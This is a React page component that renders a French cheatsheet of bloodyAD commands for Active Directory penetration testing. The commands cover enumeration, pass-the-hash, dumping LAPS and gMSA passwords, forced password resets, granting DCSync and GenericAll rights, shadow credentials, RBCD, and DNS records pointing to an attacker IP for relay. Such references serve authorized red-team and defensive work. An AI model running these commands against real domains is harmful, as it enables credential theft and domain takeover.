"use client";

export default function BloodyADPage() {
  type CommandItem = {
    cmd: string;
    why: string;
  };

  type CommandSection = {
    title: string;
    groupId?: string;
    commands: CommandItem[];
  };

  const installMethods: CommandSection = {
    title: "Installation",
    commands: [
      {
        cmd: "pipx install git+https://github.com/CravateRouge/bloodyAD",
        why: "Installe bloodyAD dans un environnement isolé via pipx (recommandé).",
      },
      {
        cmd: "sudo apt install bloodyad -y",
        why: "Installation via APT sur Debian/Ubuntu si le paquet est disponible.",
      },
    ],
  };

  const basics: CommandSection = {
    title: "Verify + Syntax",
    commands: [
      { cmd: "bloodyAD --help", why: "Vérifie l'installation et affiche les commandes disponibles." },
      {
        cmd: "bloodyAD --host $DC -d $DOMAIN -u '$USER' -p '$PASS' [command]",
        why: "Syntaxe générale — authentification password classique.",
      },
      {
        cmd: "bloodyAD --host $DC -d $DOMAIN -u '$USER' -p ':$NTHASH' [command]",
        why: "Pass-the-Hash : préfixer le hash avec `:` en guise de mot de passe.",
      },
      {
        cmd: "bloodyAD --host $DC -d $DOMAIN -k [command]",
        why: "Authentification Kerberos (ccache courant). Utiliser le FQDN, pas l'IP.",
      },
    ],
  };

  const sections: CommandSection[] = [
    // ── Enumeration - Users ───────────────────────────────────────
    {
      title: "Enum - Users",
      groupId: "enum",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get children --otype user",
          why: "Liste tous les comptes utilisateurs du domaine.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET_USER'",
          why: "Récupère tous les attributs LDAP d'un utilisateur spécifique.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET_USER' --attr userAccountControl",
          why: "Lit les flags UAC (ACCOUNTDISABLE, DONT_REQ_PREAUTH, etc.).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET_USER' --attr name,distinguishedName,objectSid",
          why: "Récupère des attributs précis sur un objet utilisateur.",
        },
      ],
    },
    // ── Enumeration - Groups ──────────────────────────────────────
    {
      title: "Enum - Groups",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get children --otype group",
          why: "Liste tous les groupes du domaine.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get membership '$GROUP'",
          why: "Énumère les membres d'un groupe AD.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$USER' --attr memberOf",
          why: "Affiche tous les groupes dont un utilisateur est membre.",
        },
      ],
    },
    // ── Enumeration - Domain ──────────────────────────────────────
    {
      title: "Enum - Domain",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get children --otype computer",
          why: "Liste tous les comptes machine du domaine.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get children --otype trustedDomain",
          why: "Énumère les relations de confiance inter-domaines.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object 'DC=$DOMAIN,DC=$TLD' --attr minPwdLength",
          why: "Récupère la politique de mot de passe du domaine.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object 'DC=$DOMAIN,DC=$TLD' --attr ms-DS-MachineAccountQuota",
          why: "Vérifie le quota de comptes machine créables par un utilisateur standard.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get dnsDump > dns_records.txt",
          why: "Dump l'ensemble des enregistrements DNS du domaine.",
        },
      ],
    },
    // ── ACL & Permissions ─────────────────────────────────────────
    {
      title: "ACL - Enumeration",
      groupId: "acl",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get writable --detail",
          why: "Trouve tous les attributs sur lesquels l'utilisateur courant a des droits d'écriture.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get writable --include-del",
          why: "Inclut les objets supprimés dans la recherche de droits d'écriture.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$TARGET' --attr ntsecuritydescriptor --resolve-sd",
          why: "Affiche le descripteur de sécurité d'un objet (ACL lisible).",
        },
      ],
    },
    // ── Kerberos - Recon ──────────────────────────────────────────
    {
      title: "Kerberos - Recon",
      groupId: "kerberos",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName",
          why: "Trouve les comptes kerberoastables (SPN défini).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName",
          why: "Trouve les comptes AS-REP roastables (DONT_REQ_PREAUTH activé et compte actif).",
        },
      ],
    },
    // ── Credentials ───────────────────────────────────────────────
    {
      title: "Credentials - gMSA / LAPS",
      groupId: "creds",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$GMSA$' --attr msDS-ManagedPassword",
          why: "Lit le secret géré d'un compte gMSA/dMSA (requiert les droits ACL appropriés).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd",
          why: "Dump les mots de passe LAPS de toutes les machines accessibles.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object '$COMPUTER$' --attr ms-Mcs-AdmPwd",
          why: "Lit le mot de passe LAPS d'une machine spécifique.",
        },
      ],
    },
    // ── Credentials - Password Change ─────────────────────────────
    {
      title: "Credentials - Password",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set password '$TARGET_USER' '$NEW_PASS'",
          why: "Force le changement de mot de passe d'un utilisateur (requiert GenericAll/WriteProp).",
        },
      ],
    },
    // ── Group Membership ──────────────────────────────────────────
    {
      title: "Group - Membership",
      groupId: "group",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember '$GROUP' '$MEMBER'",
          why: "Ajoute un utilisateur ou objet dans un groupe AD.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS delete groupMember '$GROUP' '$MEMBER'",
          why: "Retire un membre d'un groupe AD.",
        },
      ],
    },
    // ── ACL Exploitation ──────────────────────────────────────────
    {
      title: "ACL - Exploitation",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add genericAll '$TARGET' '$ATTACKER_USER'",
          why: "Accorde GenericAll sur un objet cible (contrôle total).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set owner '$TARGET' '$NEW_OWNER'",
          why: "Change le propriétaire d'un objet AD (permet d'accorder ensuite des droits).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add dcsync '$TARGET'",
          why: "Accorde les droits DCSync (GetChangesAll) à un objet pour extraire les hashes du domaine.",
        },
      ],
    },
    // ── UAC Manipulation ─────────────────────────────────────────
    {
      title: "UAC - Manipulation",
      groupId: "uac",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add uac '$TARGET_USER' -f DONT_REQ_PREAUTH",
          why: "Active AS-REP roasting sur un compte (supprime la pré-authentification Kerberos).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS remove uac '$TARGET_USER' -f ACCOUNTDISABLE",
          why: "Réactive un compte désactivé.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add uac '$TARGET' -f TRUSTED_TO_AUTH_FOR_DELEGATION",
          why: "Active la constrained delegation avec protocol transition (S4U2Self).",
        },
      ],
    },
    // ── Kerberos Attacks ──────────────────────────────────────────
    {
      title: "Kerberos - Attacks",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add shadowCredentials '$TARGET'",
          why: "Injecte des shadow credentials (msDS-KeyCredentialLink) pour obtenir un TGT sans mot de passe.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set object '$TARGET' servicePrincipalName -v 'cifs/service'",
          why: "Assigne un SPN à un compte pour le rendre kerberoastable.",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add rbcd '$DELEGATE_TO$' '$DELEGATE_FROM$'",
          why: "Configure le RBCD (Resource-Based Constrained Delegation) sur une machine cible.",
        },
      ],
    },
    // ── Computer Accounts ─────────────────────────────────────────
    {
      title: "Computer - Accounts",
      groupId: "computer",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add computer '<computer_name>' '<computer_password>'",
          why: "Crée un compte machine (utile pour RBCD si le quota MachineAccountQuota > 0).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add badSuccessor '$ATTACKER_DMSA'",
          why: "Exploite la primitive BadSuccessor via un compte dMSA contrôlé.",
        },
      ],
    },
    // ── DNS ───────────────────────────────────────────────────────
    {
      title: "DNS - Operations",
      groupId: "dns",
      commands: [
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add dnsRecord '$RECORD' '$ATTACKER_IP'",
          why: "Ajoute un enregistrement DNS (utile pour NTLM relay ou coercition).",
        },
        {
          cmd: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS remove dnsRecord '$RECORD' '<ip>'",
          why: "Supprime un enregistrement DNS précédemment ajouté (nettoyage).",
        },
      ],
    },
  ];

  return (
    <div className="mx-auto max-w-3xl px-6 py-10 lg:px-10">
      <header className="mb-8 border-b border-border pb-6">
        <p className="mb-2 text-[11px] font-mono uppercase tracking-widest text-primary">
          Cheatsheets
        </p>
        <h1 className="text-2xl font-semibold tracking-tight text-foreground sm:text-3xl">
          BloodyAD
        </h1>
        <p className="mt-3 text-sm leading-7 text-muted-foreground">
          Cheatsheet bloodyAD — énumération AD, ACL, Kerberos, credentials et exploitation depuis Linux.
        </p>
      </header>

      <section id="install" className="mb-6 rounded-sm border border-border p-5">
        <h2 className="mb-3 font-mono text-xs uppercase tracking-widest text-primary">{installMethods.title}</h2>
        <div className="space-y-4">
          {installMethods.commands.map((item) => (
            <article key={item.cmd} className="rounded-sm border border-border/60 p-3">
              <pre className="overflow-x-auto rounded-sm bg-muted/30 p-3 text-xs text-foreground">
                <code>{item.cmd}</code>
              </pre>
              <p className="mt-2 text-xs text-muted-foreground">{item.why}</p>
            </article>
          ))}
        </div>
      </section>

      <section id="syntax" className="mb-6 rounded-sm border border-border p-5">
        <h2 className="mb-3 font-mono text-xs uppercase tracking-widest text-primary">{basics.title}</h2>
        <div className="space-y-4">
          {basics.commands.map((item) => (
            <article key={item.cmd} className="rounded-sm border border-border/60 p-3">
              <pre className="overflow-x-auto rounded-sm bg-muted/30 p-3 text-xs text-foreground">
                <code>{item.cmd}</code>
              </pre>
              <p className="mt-2 text-xs text-muted-foreground">{item.why}</p>
            </article>
          ))}
        </div>
      </section>

      <section className="space-y-4">
        {sections.map((section) => (
          <article key={section.title} id={section.groupId} className="rounded-sm border border-border p-5">
            <h2 className="font-mono text-xs uppercase tracking-widest text-primary">{section.title}</h2>
            <div className="mt-3 space-y-4">
              {section.commands.map((item) => (
                <article key={item.cmd} className="rounded-sm border border-border/60 p-3">
                  <pre className="overflow-x-auto rounded-sm bg-muted/30 p-3 text-xs text-foreground">
                    <code>{item.cmd}</code>
                  </pre>
                  <p className="mt-2 text-xs text-muted-foreground">{item.why}</p>
                </article>
              ))}
            </div>
          </article>
        ))}
      </section>
    </div>
  );
}
